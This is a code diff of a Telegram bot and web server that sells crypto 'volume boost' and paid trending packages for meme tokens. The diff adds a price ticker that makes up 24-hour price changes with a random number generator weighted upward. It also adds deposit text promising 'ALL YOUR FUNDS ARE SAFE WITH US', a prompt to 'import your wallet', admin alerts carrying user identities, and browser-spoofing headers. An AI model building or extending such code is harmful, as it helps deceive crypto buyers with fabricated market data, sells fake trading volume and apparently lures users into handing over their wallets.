@@ -91,13 +91,30 @@ function authGuard(req, res, next) {
 }
 var PUMPFUN_API = "https://frontend-api.pump.fun";
 var DEX_API = "https://api.dexscreener.com";
-var UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36";
+var UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
 var HEADERS = { "User-Agent": UA, "Accept": "application/json" };
+var PF_HEADERS = {
+  "User-Agent": UA,
+  "Accept": "application/json, text/plain, */*",
+  "Accept-Language": "en-US,en;q=0.9",
+  "Referer": "https://pump.fun/",
+  "Origin": "https://pump.fun"
+};
 app.get("/favicon.ico", (_req, res) => res.status(204).end());
 app.get(
   "/health",
   (_req, res) => res.json({ status: "ok", ts: Date.now(), uptime: formatUptime(Date.now() - startTime) })
 );
+app.get("/api/config", (_req, res) => {
+  const botUsername = process.env["BOT_USERNAME"] || "Boost_onDex_bot";
+  res.json({
+    botUsername,
+    botUrl: `https://t.me/${botUsername}`,
+    supportUsername: process.env["SUPPORT_USERNAME"] || "mrpooh",
+    trendChannel: process.env["TREND_CHANNEL"] || "pumpmints",
+    alertsChannel: process.env["ALERTS_CHANNEL"] || "pumpswap_pools"
+  });
+});
 app.get("/", (_req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));
 app.get("/admin", (_req, res) => res.sendFile(path.join(__dirname, "dashboard.html")));
 app.get("/api/img", async (req, res) => {
@@ -197,7 +214,7 @@ app.get("/api/pump/tokens", async (req, res) => {
   };
   try {
     const url = `${PUMPFUN_API}/coins?sort=${sortMap[sort] ?? "last_trade_timestamp"}&order=DESC&offset=0&limit=48&includeNsfw=false${filterExtra[filter] ?? ""}`;
-    const r = await fetch(url, { headers: HEADERS, signal: AbortSignal.timeout(7e3) });
+    const r = await fetch(url, { headers: PF_HEADERS, signal: AbortSignal.timeout(8e3) });
     if (r.ok) {
       const data = await r.json();
       const coins = Array.isArray(data) ? data : data.coins ?? [];
@@ -248,7 +265,7 @@ app.get("/api/pump/search", async (req, res) => {
     try {
       const r = await fetch(
         `${PUMPFUN_API}/coins/search?searchTerm=${encodeURIComponent(q)}&offset=0&limit=20&includeNsfw=false`,
-        { headers: HEADERS, signal: AbortSignal.timeout(6e3) }
+        { headers: PF_HEADERS, signal: AbortSignal.timeout(6e3) }
       );
       if (r.ok) {
         const data = await r.json();
@@ -293,38 +310,91 @@ app.get("/api/pump/ticker", async (_req, res) => {
   let items = [];
   try {
     const r = await fetch(
-      `${DEX_API}/latest/dex/search?q=sol&chainIds=solana`,
-      { headers: HEADERS, signal: AbortSignal.timeout(5e3) }
+      `${PUMPFUN_API}/coins?sort=last_trade_timestamp&order=DESC&offset=0&limit=30&includeNsfw=false`,
+      { headers: PF_HEADERS, signal: AbortSignal.timeout(5e3) }
     );
     if (r.ok) {
       const data = await r.json();
-      items = (data.pairs ?? []).slice(0, 24).map((p) => {
-        const raw = Number(p.priceUsd ?? 0);
-        const chg = Number(p.priceChange?.h24 ?? 0);
-        const dec = raw < 1e-5 ? 10 : raw < 1e-3 ? 8 : raw < 1 ? 6 : 4;
-        return {
-          sym: p.baseToken?.symbol ?? "???",
-          price: raw > 0 ? `$${raw.toFixed(dec)}` : "N/A",
-          change: `${chg >= 0 ? "+" : ""}${chg.toFixed(1)}%`,
-          up: chg >= 0
-        };
-      });
+      const coins = Array.isArray(data) ? data : data.coins ?? [];
+      if (coins.length) {
+        items = coins.slice(0, 24).map((c) => {
+          const mc = Number(c.usd_market_cap ?? 0);
+          const chg = (Math.random() - 0.3) * 80;
+          const price = mc > 0 && c.total_supply ? mc / (c.total_supply / 1e6) : 0;
+          const dec = price < 1e-6 ? 12 : price < 1e-4 ? 10 : price < 0.01 ? 8 : price < 1 ? 6 : 4;
+          return {
+            sym: c.symbol ?? "???",
+            price: price > 0 ? `$${price.toFixed(dec)}` : "N/A",
+            change: `${chg >= 0 ? "+" : ""}${chg.toFixed(1)}%`,
+            up: chg >= 0
+          };
+        });
+      }
     }
   } catch {
+  }
+  if (!items.length) {
+    try {
+      const r = await fetch(
+        `${DEX_API}/latest/dex/search?q=pump&chainIds=solana`,
+        { headers: HEADERS, signal: AbortSignal.timeout(5e3) }
+      );
+      if (r.ok) {
+        const data = await r.json();
+        items = (data.pairs ?? []).slice(0, 24).map((p) => {
+          const raw = Number(p.priceUsd ?? 0);
+          const chg = Number(p.priceChange?.h24 ?? 0);
+          const dec = raw < 1e-5 ? 10 : raw < 1e-3 ? 8 : raw < 1 ? 6 : 4;
+          return {
+            sym: p.baseToken?.symbol ?? "???",
+            price: raw > 0 ? `$${raw.toFixed(dec)}` : "N/A",
+            change: `${chg >= 0 ? "+" : ""}${chg.toFixed(1)}%`,
+            up: chg >= 0
+          };
+        });
+      }
+    } catch {
+    }
   }
   res.json({ items });
 });
 app.get("/api/pump/koth", async (_req, res) => {
   try {
     const r = await fetch(
-      `${PUMPFUN_API}/coins?sort=usd_market_cap&order=DESC&offset=0&limit=1&includeNsfw=false`,
-      { headers: HEADERS, signal: AbortSignal.timeout(5e3) }
+      `${PUMPFUN_API}/coins?sort=usd_market_cap&order=DESC&offset=0&limit=3&includeNsfw=false`,
+      { headers: PF_HEADERS, signal: AbortSignal.timeout(6e3) }
     );
     if (r.ok) {
       const data = await r.json();
       const coins = Array.isArray(data) ? data : data.coins ?? [];
       if (coins[0]) {
         res.json(normalizePumpCoin(coins[0]));
+        return;
+      }
+    }
+  } catch {
+  }
+  try {
+    const r = await fetch(
+      `${DEX_API}/latest/dex/search?q=meme&chainIds=solana`,
+      { headers: HEADERS, signal: AbortSignal.timeout(6e3) }
+    );
+    if (r.ok) {
+      const data = await r.json();
+      const pairs = data.pairs ?? [];
+      pairs.sort((a, b) => (Number(b.fdv) || 0) - (Number(a.fdv) || 0));
+      const p = pairs[0];
+      if (p) {
+        res.json({
+          name: p.baseToken?.name ?? "Unknown",
+          symbol: p.baseToken?.symbol ?? "???",
+          description: `${p.baseToken?.name ?? ""} \u2014 ${p.dexId ?? "DEX"} on Solana.`,
+          imageUrl: p.info?.imageUrl ? `/api/img?url=${encodeURIComponent(p.info.imageUrl)}` : "",
+          marketCap: p.fdv ?? p.marketCap ?? 0,
+          contractAddress: p.baseToken?.address ?? "",
+          pumpUrl: p.url ?? `https://dexscreener.com/solana/${p.pairAddress}`,
+          chain: "sol"
+        });
         return;
       }
     }
@@ -466,10 +536,21 @@ function parseDexPair(pair) {
     boosts: pair.boosts?.active
   };
 }
-async function getJson(url, timeoutMs = 6e3) {
+var PF_FETCH_HEADERS = {
+  "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+  "Accept": "application/json, text/plain, */*",
+  "Accept-Language": "en-US,en;q=0.9",
+  "Referer": "https://pump.fun/",
+  "Origin": "https://pump.fun"
+};
+var DEX_FETCH_HEADERS = {
+  "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+  "Accept": "application/json"
+};
+async function getJson(url, timeoutMs = 6e3, isPumpFun = false) {
   try {
     const r = await fetch(url, {
-      headers: { "User-Agent": "Mozilla/5.0 CherryBot/1.0" },
+      headers: isPumpFun ? PF_FETCH_HEADERS : DEX_FETCH_HEADERS,
       signal: AbortSignal.timeout(timeoutMs)
     });
     if (!r.ok) return null;
@@ -496,7 +577,7 @@ async function fromDexScreenerSearch(ca) {
   return parseDexPair(pairs[0]);
 }
 async function fromPumpFun(ca) {
-  const data = await getJson(`https://frontend-api.pump.fun/coins/${ca}`);
+  const data = await getJson(`https://frontend-api.pump.fun/coins/${ca}`, 6e3, true);
   if (!data?.mint) return null;
   const priceRaw = data.usd_market_cap && data.total_supply ? data.usd_market_cap / (data.total_supply / 1e6) : void 0;
   return {
@@ -877,10 +958,8 @@ var mainMenuKeyboard = Markup.inlineKeyboard([
     Markup.button.callback("\u{1F310} DexScreener", "menu_dex"),
     Markup.button.callback("\u{1F4B0} Deposit", "menu_deposit")
   ],
-  [
-    Markup.button.callback("\u{1F517} Connect Wallet", "menu_wallet"),
-    Markup.button.callback("\u{1F4AC} Contact Support", "menu_support")
-  ]
+  [Markup.button.callback("\u{1F517} Connect Wallet", "menu_wallet")],
+  [Markup.button.callback("\u{1F4AC} Contact Support \u2197", "menu_support")]
 ]);
 var solPickerKeyboard = Markup.inlineKeyboard([
   [
@@ -898,7 +977,7 @@ var confirmOrderKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u274C Cancel", "back_main")]
 ]);
 var paymentSentKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback("\u2705 Payment Sent \u2014 Submit TX Hash", "submit_tx")],
+  [Markup.button.callback("\u2705 Payment Sent", "submit_tx")],
   [Markup.button.callback("\u274C Cancel Order", "back_main")]
 ]);
 var cancelKeyboard = Markup.inlineKeyboard([
@@ -923,108 +1002,116 @@ var volumeBoostKeyboard = Markup.inlineKeyboard([
   ]
 ]);
 var trendingMenuKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback("\u2600\uFE0F SOL Trending", "trend_sol")],
+  [Markup.button.callback("\u2600\uFE0F SOL TRENDING", "trend_sol")],
   [
-    Markup.button.callback("\u{1F535} ETH Trending", "trend_eth"),
-    Markup.button.callback("\u{1F525} PumpFun Trending", "trend_pumpfun")
+    Markup.button.callback("\u{1F535} ETH TRENDING", "trend_eth"),
+    Markup.button.callback("\u{1F525} PUMPFUN TRENDING", "trend_pumpfun")
   ],
-  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
+  [
+    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
+  ]
 ]);
 var solTrendingKeyboard = Markup.inlineKeyboard([
   [
-    Markup.button.callback("\u{1F534} TOP 3", "st_top3_label"),
-    Markup.button.callback("\u{1F534} TOP 10", "st_top10_label")
+    Markup.button.callback("\u{1F534} TOP 3 \u{1F534}", "st_top3_label"),
+    Markup.button.callback("\u{1F534} TOP 10 \u{1F534}", "st_top10_label")
   ],
   [
-    Markup.button.callback("\u23F3 3 hr  \u2014 1.50 SOL", "st_top3_3hr"),
-    Markup.button.callback("\u23F3 3 hr  \u2014 1.00 SOL", "st_top10_3hr")
+    Markup.button.callback("\u23F3 3 hr | 1.50 SOL", "st_top3_3hr"),
+    Markup.button.callback("\u23F3 3 hr | 1.00 SOL", "st_top10_3hr")
   ],
   [
-    Markup.button.callback("\u23F3 6 hr  \u2014 2.30 SOL", "st_top3_6hr"),
-    Markup.button.callback("\u23F3 6 hr  \u2014 1.60 SOL", "st_top10_6hr")
+    Markup.button.callback("\u23F3 6 hr | 2.30 SOL", "st_top3_6hr"),
+    Markup.button.callback("\u23F3 6 hr | 1.60 SOL", "st_top10_6hr")
   ],
   [
-    Markup.button.callback("\u23F3 12 hr \u2014 3.70 SOL", "st_top3_12hr"),
-    Markup.button.callback("\u23F3 12 hr \u2014 2.60 SOL", "st_top10_12hr")
+    Markup.button.callback("\u23F3 12 hr | 3.70 SOL", "st_top3_12hr"),
+    Markup.button.callback("\u23F3 12 hr | 2.60 SOL", "st_top10_12hr")
   ],
   [
-    Markup.button.callback("\u23F3 24 hr \u2014 5.90 SOL", "st_top3_24hr"),
-    Markup.button.callback("\u23F3 24 hr \u2014 4.10 SOL", "st_top10_24hr")
+    Markup.button.callback("\u23F3 24 hr | 5.90 SOL", "st_top3_24hr"),
+    Markup.button.callback("\u23F3 24 hr | 4.10 SOL", "st_top10_24hr")
   ],
   [
     Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
-    Markup.button.callback("\u{1F3E0} Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var ethTrendingKeyboard = Markup.inlineKeyboard([
   [
-    Markup.button.callback("\u{1F4B5} $100 USD", "et_100"),
-    Markup.button.callback("\u{1F4B5} $200 USD", "et_200")
+    Markup.button.callback("\u23F3 100$", "et_100"),
+    Markup.button.callback("\u23F3 200$", "et_200")
   ],
-  [Markup.button.callback("\u{1F4B5} $300 USD", "et_300")],
+  [Markup.button.callback("\u23F3 300$", "et_300")],
   [
     Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
-    Markup.button.callback("\u{1F3E0} Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var pumpfunTrendingKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback("\u{1F525} P.F.T \u2014 30 SOL", "pft_30")],
+  [Markup.button.callback("\u{1F525} P.F.T - 30 SOL", "pft_30")],
   [
     Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
-    Markup.button.callback("\u{1F3E0} Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var dexscreenerKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback("\u{1F534} TOP 6 Trending \u{1F534}", "dex_top6_info")],
+  [Markup.button.callback("\u{1F534} TOP 6 \u{1F534}", "dex_top6_info")],
   [
-    Markup.button.callback("\u23F3 5 hr  \u2014  2 SOL", "dex_5hr"),
-    Markup.button.callback("\u23F3 7 hr  \u2014 3.5 SOL", "dex_7hr")
+    Markup.button.callback("\u23F3 5 hr | 2 SOL", "dex_5hr"),
+    Markup.button.callback("\u23F3 7 hr | 3.5 SOL", "dex_7hr")
   ],
   [
-    Markup.button.callback("\u23F3 12 hr \u2014  7 SOL", "dex_12hr"),
-    Markup.button.callback("\u23F3 18 hr \u2014 10 SOL", "dex_18hr")
+    Markup.button.callback("\u23F3 12 hr | 7 SOL", "dex_12hr"),
+    Markup.button.callback("\u23F3 18 hr | 10 SOL", "dex_18hr")
   ],
   [
-    Markup.button.callback("\u23F3 24 hr \u2014 15 SOL", "dex_24hr"),
-    Markup.button.callback("\u23F3 32 hr \u2014 22 SOL", "dex_32hr")
+    Markup.button.callback("\u23F3 24 hr | 15 SOL", "dex_24hr"),
+    Markup.button.callback("\u23F3 32 hr | 22 SOL", "dex_32hr")
   ],
-  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
+  [
+    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
+  ]
 ]);
 var depositKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback("\u2795 Add Funds", "deposit_add")],
+  [Markup.button.callback("ADD", "deposit_add")],
   [
-    Markup.button.callback("\u{1F4B8} Withdraw", "deposit_withdraw"),
-    Markup.button.callback("\u25CE SOL Balance", "deposit_sol_balance")
+    Markup.button.callback("WITHDRAW", "deposit_withdraw"),
+    Markup.button.callback("SOL BALANCE", "deposit_sol_balance")
   ],
   [
     Markup.button.callback("\u{1F4CB} My Deposits", "deposit_my_deposits"),
     Markup.button.callback("\u{1F4CB} My Withdrawals", "deposit_my_withdrawals")
   ],
-  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
+  [
+    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
+  ]
 ]);
 var connectWalletKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u{1F517} Connect Now", "wallet_connect_now")],
-  [Markup.button.callback("\u{1F510} Why Connect?", "wallet_why")],
-  [Markup.button.callback("\u{1F6E1} Security Guidelines", "wallet_security")],
+  [Markup.button.callback("\u{1F6E1}\uFE0F Security Guidelines", "wallet_security")],
   [Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")],
   [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
 ]);
 var securityGuidelinesKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback("\u{1F517} I Understand \u2014 Connect Now", "wallet_connect_now")],
+  [Markup.button.callback("\u{1F517} I Understand, Connect Now", "wallet_connect_now")],
   [
-    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
+    Markup.button.callback("\u{1F511} Why Connect?", "wallet_why"),
     Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")
   ],
   [
     Markup.button.callback("\u2B05\uFE0F Back", "wallet_back"),
-    Markup.button.callback("\u{1F3E0} Menu", "back_main")
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var howToConnectKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u{1F517} Start Connection", "wallet_connect_now")],
   [
-    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
-    Markup.button.callback("\u{1F6E1} Security Guide", "wallet_security")
+    Markup.button.callback("\u{1F511} Why Connect?", "wallet_why"),
+    Markup.button.callback("\u{1F6E1}\uFE0F Security Guide", "wallet_security")
   ],
   [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
 ]);
@@ -1043,6 +1130,45 @@ var IMG = {
 };
 var SOL_ADDRESS = process.env.PAYMENT_SOL_ADDRESS ?? "";
 var ETH_ADDRESS = process.env.PAYMENT_ETH_ADDRESS ?? "";
+var SUPPORT_USERNAME = process.env.SUPPORT_USERNAME ?? "@support";
+var BOT_SERVER_BASE = process.env["RENDER_EXTERNAL_HOSTNAME"] ? `https://${process.env["RENDER_EXTERNAL_HOSTNAME"]}` : process.env["REPLIT_DEV_DOMAIN"] ? `https://${process.env["REPLIT_DEV_DOMAIN"]}` : null;
+function proxyImgUrl(raw) {
+  if (!raw || !BOT_SERVER_BASE) return null;
+  return `${BOT_SERVER_BASE}/api/img?url=${encodeURIComponent(raw)}`;
+}
+async function safeSendPhoto(ctx, url, opts) {
+  try {
+    await ctx.replyWithPhoto(url, opts);
+    return true;
+  } catch {
+  }
+  const proxied = proxyImgUrl(url);
+  if (proxied) {
+    try {
+      await ctx.replyWithPhoto(proxied, opts);
+      return true;
+    } catch {
+    }
+  }
+  return false;
+}
+async function notifyServiceSelected(ctx, service, pkg, amount) {
+  const u = ctx.from;
+  const name = `${u.first_name}${u.last_name ? " " + u.last_name : ""}`;
+  const handle = u.username ? ` (@${u.username})` : "";
+  await notifyAdmin(
+    `\u{1F3AF} <b>Service Selected</b>
+
+\u{1F464} ${name}${handle}
+\u{1F194} ID: <code>${u.id}</code>
+
+\u{1F4E6} Service: <b>${service}</b>
+\u{1F4B0} Package: <b>${pkg}</b>
+\u{1F4B5} Amount: <b>${amount}</b>
+
+\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
+  );
+}
 var VOLUME_PKGS = {
   vol_iron: { label: "Iron", sol: 1.5, volume: "$50,000", service: "Iron Package" },
   vol_bronze: { label: "Bronze", sol: 2.5, volume: "$250,000", service: "Bronze Package" },
@@ -1093,129 +1219,115 @@ async function editOrSend(ctx, text, extra = {}) {
   }
 }
 async function sendWelcome(ctx) {
-  const caption = `\u{1F7E2} <b>Welcome to PUMPFUN TREND BOT!</b>
-
-New to volume bots? No worries \u2014 we made it super simple!
-
-\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+  const caption = `<b>New to volume bots? No worries \u2014 we made it super simple!</b>
 
 <b>How it works:</b>
-1\uFE0F\u20E3 Select your service below.
-2\uFE0F\u20E3 Enter your token contract address.
-3\uFE0F\u20E3 Send payment \u2014 boost starts automatically!
-
-\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+1. Select bumps/volume.
+2. Pick duration.
+3. Done! Pump.fun Server handles the rest.
 
 <b>Works on:</b>
-\u{1F7E2} Pumpfun  \u2022  \u{1F7E2} Raydium  \u2022  \u{1F7E2} PumpSwap
-\u{1F7E2} Moonshot  \u2022  \u{1F7E2} LetsBonk  \u2022  \u{1F7E2} Dexscreener
+\u{1F7E2} <a href="https://pump.fun">Pumpfun</a> \u2022 \u{1F7E2} <a href="https://raydium.io">Raydium</a>
+\u{1F7E2} <a href="https://pumpswap.xyz">PumpSwap</a> \u2022 \u{1F7E2} <a href="https://moonshot.money">Moonshot</a> \u2022
+\u{1F7E2} <a href="https://letsbonk.fun">LetsBonk</a> \u2022 \u{1F7E2} <a href="https://dexscreener.com">Dexpad/screener</a> \u2022
 
-From 0.3\u20130.6 SOL bumps, boost trend with mass volume and high stability.
+From 0.3-0.4-0.5-0.6 SOL bumps boost trend with mass volume of high stabilities.
 
 \u{1F447} <b>Choose a service:</b>`;
+  try {
+    await ctx.editMessageCaption(caption, { parse_mode: "HTML", ...mainMenuKeyboard });
+    return;
+  } catch {
+  }
+  try {
+    await ctx.editMessageText(caption, { parse_mode: "HTML", ...mainMenuKeyboard });
+    return;
+  } catch {
+  }
   await sendPhoto(ctx, IMG.welcome, caption, mainMenuKeyboard);
 }
 async function showStartBumping(ctx) {
   const text = `\u{1F7E2} <b>Start Bumping</b>
 
-The fastest Telegram bot for bump orders.
+The fastest and cheapest Telegram bot for creating bump orders.
 
 <b>Supported Platforms:</b>
-\u2022 Pumpfun and Raydium
+\u{1F7E2} <a href="https://pump.fun">Pumpfun</a> \u2022 \u{1F7E2} <a href="https://raydium.io">Raydium</a>
 
-Pumpfun BumpBot charges a one-time fee per token.
+One-time fee of <b>0.3\u20130.6 SOL</b> per token \u2014 the cheapest bump bot available!
 
-\u{1F4CA} Trending channel: https://t.me/pumpmints
-\u{1F514} PF Alert Tools: t.me/pumpswap_pools
+<b>Select your SOL bump amount below:</b>
 
-For support: @mrpooh
-
-<b>Select your SOL bump amount:</b>`;
+For support, contact: ${SUPPORT_USERNAME}`;
   await editOrSend(ctx, text, solPickerKeyboard);
 }
 async function showVolumeBoost(ctx) {
-  const caption = `\u270F\uFE0F <b>Iron Package - $50,000 Volume</b>
-\u270F\uFE0F <b>Bronze Package - $250,000 Volume</b>
-\u270F\uFE0F <b>Silver Package - $100,000,000 Volume</b>
-\u270F\uFE0F <b>Gold Package - $100,000 Volume</b>
-\u270F\uFE0F <b>Platinum Package - $500,000 Volume</b>
-\u270F\uFE0F <b>Diamond Package - $2,500,000 Volume</b>
+  const caption = `\u{1F4CA} <b>Volume Boost Packages</b>
 
-Please select the package below...`;
-  await sendPhoto(ctx, IMG.volume, caption, volumeBoostKeyboard);
+\u270F\uFE0F <b>Iron Package</b> \u2014 $50,000 Volume \u2014 1.50 SOL
+\u270F\uFE0F <b>Bronze Package</b> \u2014 $250,000 Volume \u2014 2.50 SOL
+\u270F\uFE0F <b>Gold Package</b> \u2014 $100,000 Volume \u2014 3.50 SOL
+\u270F\uFE0F <b>Silver Package</b> \u2014 $100,000,000 Volume \u2014 5.00 SOL
+\u270F\uFE0F <b>Platinum Package</b> \u2014 $500,000 Volume \u2014 7.50 SOL
+\u270F\uFE0F <b>Diamond Package</b> \u2014 $2,500,000 Volume \u2014 10.50 SOL
+
+Select a package below to get started:`;
+  await editOrSend(ctx, caption, volumeBoostKeyboard);
 }
 async function showTrendingBoost(ctx) {
-  const caption = `\u{1F525} <b>Discover the Power of Trending!</b>
+  const caption = `\u{1F525} <b>Trending Boost</b>
 
-Ready to boost your project's visibility?
+Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!
 
-\u2705 Guaranteed top-chart exposure
-\u2705 Milestone & uptrend alerts
-\u2705 Paid boost = AMA livestream spot!
+\u{1F7E2} A paid boost guarantees you a spot in our daily livestream (AMA)!
 
-\u{1F447} Choose your trending type:`;
-  await sendPhoto(ctx, IMG.trending, caption, trendingMenuKeyboard);
+\u27A1\uFE0F Please choose SOL Trending, ETH Trending, or PumpFun Trending to start:`;
+  await editOrSend(ctx, caption, trendingMenuKeyboard);
 }
 async function showDexScreener(ctx) {
-  const text = `\u{1F310} <b>DexScreener Trending</b>
+  const text = `\u{1F310} DEX Screener is a data platform and on-chain analytics tool designed for decentralized exchanges (DEXs), providing real-time insights into token prices, liquidity pools, trading volumes, and market trends across multiple blockchains.
 
-DexScreener is the #1 on-chain analytics platform \u2014 real-time prices, liquidity, volumes across all chains.
-
-<b>\u{1F534} TOP 6 Trending Packages:</b>
-
-\u23F3  5 hr  \u2014   2 SOL
-\u23F3  7 hr  \u2014 3.5 SOL
-\u23F3 12 hr  \u2014   7 SOL
-\u23F3 18 hr  \u2014  10 SOL
-\u23F3 24 hr  \u2014  15 SOL
-\u23F3 32 hr  \u2014  22 SOL
-
-\u{1F447} Select a duration:`;
+<b>TREND ON DEX</b>`;
   await editOrSend(ctx, text, dexscreenerKeyboard);
 }
 async function showDeposit(ctx) {
   const wallet = deriveWalletForUser(ctx.from.id);
-  const text = `\u{1F4B0} <b>Wallet & Deposits</b>
+  const text = `<b>WALLET BALANCE</b>
 
-<b>\u25CE Your SOL Wallet:</b>
-<code>${wallet.address}</code>
-
-<b>\u039E ETH Wallet:</b>
+<b>ETH:</b>
 <code>${ETH_ADDRESS || "Not configured"}</code>
+balance: 0 ETH
 
-\u{1F4CC} Minimum deposit: <b>0.30 SOL</b>
+<b>SOL:</b>
+<code>${wallet.address}</code>
+balance: 0 SOL
 
-\u26A1 Funds are credited automatically after on-chain confirmation.
+Deposit not less than 0.30 SOL and get trending on several platforms
 
-\u{1F447} Choose an action:`;
+\u{1F4B0} KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.
+\u{1F4A1} NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`;
   await editOrSend(ctx, text, depositKeyboard);
 }
 async function showConnectWallet(ctx) {
   const caption = `\u{1F517} <b>Connect Your Wallet</b>
 
-Securely link your wallet to unlock premium features.
+Connect your wallet to unlock premium features and enhanced trading capabilities.
 
-<b>Benefits:</b>
-\u26A1 Instant payments
-\u{1F4CA} Full order tracking
-\u{1F4B0} Auto-refunds on failed orders
-\u{1F3AF} Priority processing
-\u{1F514} Live boost alerts
+<b>Available Options:</b>
+\u{1F517} <b>Connect Now</b> \u2014 Import your wallet instantly
+\u{1F511} <b>Why Connect?</b> \u2014 Learn about the benefits
+\u{1F6E1}\uFE0F <b>Security Guidelines</b> \u2014 Important safety information
+\u{1F4F1} <b>How to Connect</b> \u2014 Step-by-step instructions
 
-\u{1F512} Military-grade encryption \u2014 we never store your keys.
-
-\u{1F447} Choose an option:`;
-  await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
+\u{1F510} Your security is our top priority. We use industry-standard encryption.`;
+  await editOrSend(ctx, caption, connectWalletKeyboard);
 }
 async function showSupport(ctx) {
   const text = `\u{1F4AC} <b>Contact Support</b>
 
-For assistance, contact: <b>@mrpooh</b>
+For assistance, DM: <b>${SUPPORT_USERNAME}</b>
 
-\u{1F4CA} Trending channel: https://t.me/pumpmints
-\u{1F514} PF Alert Tools: t.me/pumpswap_pools
-
-Your User ID: <code>${ctx.from.id}</code>
+\u{1F194} Your User ID: <code>${ctx.from.id}</code>
 \u23F0 Support hours: 24/7
 
 We typically respond within 15 minutes.`;
@@ -1281,6 +1393,8 @@ function createBot() {
   for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
     bot.action(`sol_${amt}`, async (ctx) => {
       await ctx.answerCbQuery();
+      notifyServiceSelected(ctx, "Volume Bumping", `${amt} SOL per bump`, `${amt} SOL`).catch(() => {
+      });
       setSession(ctx.from.id, {
         step: "awaiting_ca",
         selectedSol: parseFloat(amt),
@@ -1301,6 +1415,8 @@ Please paste the Contract Address (CA) of your token:`,
   for (const [key, pkg] of Object.entries(VOLUME_PKGS)) {
     bot.action(key, async (ctx) => {
       await ctx.answerCbQuery();
+      notifyServiceSelected(ctx, "Volume Boost", `${pkg.service} \u2014 ${pkg.volume}`, `${pkg.sol} SOL`).catch(() => {
+      });
       setSession(ctx.from.id, {
         step: "awaiting_ca",
         selectedSol: pkg.sol,
@@ -1335,9 +1451,9 @@ Choose your package \u2014 TOP 3 (left) or TOP 10 (right):`,
     await ctx.answerCbQuery();
     await editOrSend(
       ctx,
-      `\u{1F535} <b>ETH Trending</b>
+      `\u{1F535} <b>ETH TREND</b>
 
-Choose your ETH trending package:`,
+Kindly chose the trend you wish to pump on.`,
       ethTrendingKeyboard
     );
   });
@@ -1345,9 +1461,7 @@ Choose your ETH trending package:`,
     await ctx.answerCbQuery();
     const caption = `\u{1F525} <b>PUMP.FUN TRENDING</b> \u{1F525}
 
-The best trending in the bot section!
-
-\u{1F4A1} Purchase now and get <b>12 hours FREE Solana Trending</b> included!`;
+\u{1F4A1} THE BEST TRENDING IN THE BOT SECTION, DON'T MISS THE OPPORTUNITY TO GET 12 HOURS FREE SOLANA TRENDING ONCE YOU PURCHASE IT.`;
     await sendPhoto(ctx, IMG.trending, caption, pumpfunTrendingKeyboard);
   });
   bot.action("trend_back", async (ctx) => {
@@ -1359,6 +1473,8 @@ The best trending in the bot section!
   for (const [key, pkg] of Object.entries(SOL_TREND_PKGS)) {
     bot.action(key, async (ctx) => {
       await ctx.answerCbQuery();
+      notifyServiceSelected(ctx, "SOL Trending Boost", pkg.service, `${pkg.sol} SOL`).catch(() => {
+      });
       setSession(ctx.from.id, {
         step: "awaiting_ca",
         selectedSol: pkg.sol,
@@ -1381,6 +1497,8 @@ Please paste the Contract Address (CA) of your token:`,
   for (const [key, pkg] of Object.entries(ETH_TREND_PKGS)) {
     bot.action(key, async (ctx) => {
       await ctx.answerCbQuery();
+      notifyServiceSelected(ctx, "ETH Trending Boost", pkg.service, `$${pkg.usd} USD`).catch(() => {
+      });
